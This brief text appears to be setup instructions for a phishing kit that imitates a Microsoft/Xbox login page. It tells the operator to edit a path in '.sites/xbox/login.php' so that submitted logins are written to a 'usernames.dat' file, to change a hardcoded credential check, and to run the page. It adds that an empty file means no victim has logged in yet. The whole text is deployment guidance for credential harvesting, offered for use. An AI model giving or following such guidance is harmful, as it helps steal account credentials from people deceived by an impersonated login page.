To enable the functionality of the Microsoft page, navigate to the .sites/xbox/login.php directory. Within this directory, modify the specified line of code: $file_path = '/the rest of your path from root/micro/auth/usernames.dat'; This adjustment is crucial for accessing the contents of usernames.dat. Update the path accordingly, and make changes to the username and password within the file:
if ($email === "password" && $pass === "password") {

After making these modifications, execute the page. Keep in mind that if no one logs into the page initially, the system will create the document. If nothing is written to the document, it indicates that no login attempts have been made.
